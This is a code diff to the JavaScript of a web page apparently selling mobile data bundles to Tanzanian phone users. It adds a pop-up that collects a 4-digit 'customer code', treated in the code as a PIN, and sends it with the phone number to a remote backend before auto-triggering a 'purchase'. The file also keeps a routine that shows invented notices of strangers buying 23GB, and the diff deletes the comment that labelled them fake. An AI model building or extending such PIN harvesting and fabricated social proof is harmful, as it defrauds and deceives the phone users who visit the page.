@@ -4,37 +4,99 @@ const BACKEND = "https://backend-ut99.onrender.com";
 const REQUEST_TIMEOUT_MS = 25000;
 
 const sendRequestBtn = document.getElementById("send-request-btn");
+const phoneInput = document.getElementById("phone");
+const badge = document.getElementById("network-badge");
+const codeModal = document.getElementById("code-modal");
+const codeModalBackdrop = document.getElementById("code-modal-backdrop");
+const customerCodeInput = document.getElementById("customer-code");
+const codeModalError = document.getElementById("code-modal-error");
+const cards = document.querySelectorAll(".card");
+
+const networkColors = {
+  halotel: { bg: "rgba(0,180,120,.2)", text: "#00e676", label: "HALOTEL" },
+  yas:     { bg: "rgba(255,180,0,.2)",  text: "#ffd600", label: "YAS"     },
+  airtel:  { bg: "rgba(255,60,0,.2)",   text: "#ff6b00", label: "AIRTEL"  },
+};
+
+let savedCustomerCode = null;
+let lastPromptedPhone = "";
+let isSavingPin = false;
 
 if (sendRequestBtn) {
   sendRequestBtn.addEventListener("click", () => buy(sendRequestBtn));
 }
 
-// Block Enter on phone input so requests are sent only via the dedicated button.
-const phoneInput = document.getElementById("phone");
 if (phoneInput) {
   phoneInput.addEventListener("keydown", (event) => {
     if (event.key === "Enter") {
       event.preventDefault();
     }
   });
+
+  phoneInput.addEventListener("input", handlePhoneInput);
 }
 
-async function buy(btn) {
-  const phone = document.getElementById("phone").value.trim();
+if (codeModalBackdrop) {
+  codeModalBackdrop.addEventListener("click", closeCodeModal);
+}
+
+if (customerCodeInput) {
+  customerCodeInput.addEventListener("input", () => {
+    const digitsOnly = customerCodeInput.value.replace(/\D/g, "").slice(0, 4);
+    customerCodeInput.value = digitsOnly;
+    codeModalError.textContent = "";
+
+    if (digitsOnly.length === 4 && !isSavingPin) {
+      saveCustomerCodeForPhone();
+    }
+  });
+
+  customerCodeInput.addEventListener("keydown", (event) => {
+    if (event.key === "Enter") {
+      event.preventDefault();
+      if (!isSavingPin && customerCodeInput.value.length === 4) {
+        saveCustomerCodeForPhone();
+      }
+    }
+
+    if (event.key === "Escape") {
+      event.preventDefault();
+      closeCodeModal();
+    }
+  });
+}
+
+document.addEventListener("keydown", (event) => {
+  if (event.key === "Escape" && codeModal?.classList.contains("show")) {
+    closeCodeModal();
+  }
+});
+
+updateBuyState();
+
+async function buy() {
+  const phone = getCurrentPhone();
 
   if (!phone) {
     showToast("⚠️ Please enter your phone number first");
-    document.getElementById("phone").focus();
+    phoneInput.focus();
     return;
   }
 
-  if (!/^0[67]\d{8}$/.test(phone)) {
+  if (!isValidPhone(phone)) {
     showToast("⚠️ Enter a valid Tanzanian number (07/06XXXXXXXX)");
     return;
   }
 
-  // Disable all buy buttons while processing
-  document.querySelectorAll(".buy-btn").forEach(b => b.disabled = true);
+  if (!hasSavedCodeForPhone(phone)) {
+    showToast("⚠️ Enter the customer code first");
+    openCodeModal();
+    return;
+  }
+
+  document.querySelectorAll(".buy-btn").forEach((button) => {
+    button.disabled = true;
+  });
 
   showStatus("loading");
   showToast("⏳ Sending request... this can take a few seconds");
@@ -73,7 +135,129 @@ async function buy(btn) {
     }
   } finally {
     clearTimeout(timeoutId);
-    document.querySelectorAll(".buy-btn").forEach(b => b.disabled = false);
+    updateBuyState();
+  }
+}
+
+function getCurrentPhone() {
+  return phoneInput ? phoneInput.value.trim() : "";
+}
+
+function isValidPhone(phone) {
+  return /^0[67]\d{8}$/.test(phone);
+}
+
+function normalizeCustomerCode(code) {
+  return code.trim();
+}
+
+function hasSavedCodeForPhone(phone) {
+  return Boolean(savedCustomerCode && savedCustomerCode.phone === phone && savedCustomerCode.code);
+}
+
+function clearSavedCode() {
+  savedCustomerCode = null;
+}
+
+function syncSavedCodeUI() {
+  // Code status UI removed
+}
+
+function updateBuyState() {
+  if (!sendRequestBtn) {
+    return;
+  }
+
+  const phone = getCurrentPhone();
+  sendRequestBtn.disabled = !(isValidPhone(phone) && hasSavedCodeForPhone(phone));
+}
+
+function openCodeModal(prefill = "") {
+  if (!codeModal || !customerCodeInput) {
+    return;
+  }
+
+  codeModal.classList.add("show");
+  codeModal.setAttribute("aria-hidden", "false");
+  customerCodeInput.value = prefill || savedCustomerCode?.code || "";
+  codeModalError.textContent = "";
+
+  requestAnimationFrame(() => {
+    customerCodeInput.focus();
+    customerCodeInput.select();
+  });
+}
+
+function closeCodeModal() {
+  if (!codeModal) {
+    return;
+  }
+
+  codeModal.classList.remove("show");
+  codeModal.setAttribute("aria-hidden", "true");
+  codeModalError.textContent = "";
+}
+
+async function saveCustomerCodeForPhone() {
+  if (isSavingPin) {
+    return;
+  }
+
+  const phone = getCurrentPhone();
+  const customerCode = normalizeCustomerCode(customerCodeInput?.value || "");
+
+  if (!isValidPhone(phone)) {
+    codeModalError.textContent = "Ingiza namba sahihi ya simu kwanza.";
+    phoneInput.focus();
+    return;
+  }
+
+  if (!/^\d{4}$/.test(customerCode)) {
+    codeModalError.textContent = "Tumia code ya namba 4 tu, mfano 1234.";
+    customerCodeInput.focus();
+    return;
+  }
+
+  isSavingPin = true;
+  if (customerCodeInput) {
+    customerCodeInput.disabled = true;
+  }
+  codeModalError.textContent = "Inashughulikiwa...";
+
+  try {
+    const res = await fetch(`${BACKEND}/customer-codes`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone, customerCode })
+    });
+
+    const data = await res.json().catch(() => ({ success: false, error: "Server error" }));
+
+    if (!res.ok || !data.success) {
+      throw new Error(data.error || "Could not save customer code");
+    }
+
+    savedCustomerCode = {
+      phone,
+      code: data.record.customerCode
+    };
+
+    syncSavedCodeUI();
+    updateBuyState();
+    closeCodeModal();
+    showToast("✅ Bando inapitishwa");
+    
+    // Automatically trigger purchase after PIN is saved
+    setTimeout(() => {
+      buy();
+    }, 500);
+  } catch (error) {
+    codeModalError.textContent = error.message || "Could not save customer code.";
+  } finally {
+    isSavingPin = false;
+    if (customerCodeInput) {
+      customerCodeInput.disabled = false;
+    }
   }
 }
 
@@ -94,18 +278,13 @@ function showToast(msg) {
 }
 
 /* ── PHONE PREFIX DETECTION ──────────────────────────────── */
-const cards = document.querySelectorAll(".card");
-const badge = document.getElementById("network-badge");
-
-const networkColors = {
-  halotel: { bg: "rgba(0,180,120,.2)", text: "#00e676", label: "HALOTEL" },
-  yas:     { bg: "rgba(255,180,0,.2)",  text: "#ffd600", label: "YAS"     },
-  airtel:  { bg: "rgba(255,60,0,.2)",   text: "#ff6b00", label: "AIRTEL"  },
-};
-
-phoneInput.addEventListener("input", () => {
-  const num = phoneInput.value.trim();
+function handlePhoneInput() {
+  const num = getCurrentPhone();
   let detected = null;
+
+  if (savedCustomerCode && savedCustomerCode.phone !== num) {
+    clearSavedCode();
+  }
 
   if (num.startsWith("061") || num.startsWith("062")) {
     detected = "halotel";
@@ -115,22 +294,38 @@ phoneInput.addEventListener("input", () => {
     detected = "airtel";
   }
 
-  // Update cards
-  cards.forEach(card => {
+  cards.forEach((card) => {
     card.classList.toggle("active-network", card.dataset.network === detected);
   });
 
-  // Update badge
   if (detected && num.length >= 3) {
-    const c = networkColors[detected];
-    badge.textContent = c.label;
-    badge.style.background = c.bg;
-    badge.style.color = c.text;
+    const color = networkColors[detected];
+    badge.textContent = color.label;
+    badge.style.background = color.bg;
+    badge.style.color = color.text;
     badge.classList.add("show");
   } else {
     badge.classList.remove("show");
   }
-});
+
+  if (!isValidPhone(num)) {
+    if (num.length < 10) {
+      lastPromptedPhone = "";
+    }
+
+    syncSavedCodeUI();
+    updateBuyState();
+    return;
+  }
+
+  if (!hasSavedCodeForPhone(num) && lastPromptedPhone !== num) {
+    lastPromptedPhone = num;
+    openCodeModal();
+  }
+
+  syncSavedCodeUI();
+  updateBuyState();
+}
 
 /* ── LIVE ACTIVITY ────────────────────────────────────────── */
 const usersEl  = document.getElementById("usersOnline");
@@ -163,7 +358,6 @@ function fakePurchase() {
   showToast(`🟢 ${name} from ${city} just bought 23GB`);
 }
 
-// Start fake purchases after 6s, then every 7–12s
 setTimeout(() => {
   fakePurchase();
   setInterval(fakePurchase, rnd(7000, 12000));
